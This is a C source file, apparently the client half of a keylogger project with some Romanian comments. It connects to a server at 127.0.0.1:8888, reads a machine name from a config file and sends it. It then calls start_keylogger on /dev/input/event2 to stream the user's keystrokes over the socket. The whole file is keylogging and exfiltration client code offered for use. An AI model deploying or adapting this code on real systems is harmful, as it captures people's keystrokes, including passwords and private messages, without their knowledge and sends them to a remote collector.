#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include "keylog.h"  // Include the keylogger header
#include "constraints.h"
#include "messageManager.h"
#include "utils.h"

int main() {
    int sock;
    struct sockaddr_in server;

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        printf("Could not create socket\n");
        return 1;
    }
    printf("Socket created\n");

    server.sin_addr.s_addr = inet_addr("127.0.0.1");  // Server IP
    server.sin_family = AF_INET;
    server.sin_port = htons(8888);  // Server port

    // Connect to remote server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("Connect failed. Error");
        return 1;
    }
    printf("Connected\n");

    //Trimite Date despre Utilizator--------------------
    int fd = open(CLIENT_CONFIG_FILE, O_RDONLY);
    if (fd < 0)
    {
        printf("Error Opening Config file.\n");
        return -1;
    }

    char buffer[BUFFER_SIZE];

    ssize_t bytes_read = read(fd, buffer, sizeof(buffer) - 1);
    if (bytes_read < 0) {
        perror("Eroare la citirea fișierului");
        close(fd);
        return -1;
    }
    close(fd);

    buffer[bytes_read] = '\0';
    char sendBuffer[BUFFER_SIZE]="";
    char*p = strtok(buffer, " =\n");
    while(p)
    {
        if(strcmp(p, "Nume_Echipament") == 0)
        {
            p = strtok(NULL, "= \n");
            strcat(sendBuffer, p);
        }
        p = strtok(NULL, "= \n");
    }

    message_t msg;
    encapsulateMessage(&msg, sendBuffer, 'U');

    send_message(sock, &msg);


    // Start the keylogger and send keystrokes to server
    start_keylogger(sock, "/dev/input/event2");  // Pass the socket and device path

    // Close the socket
    close(sock);
    
    return 0;
}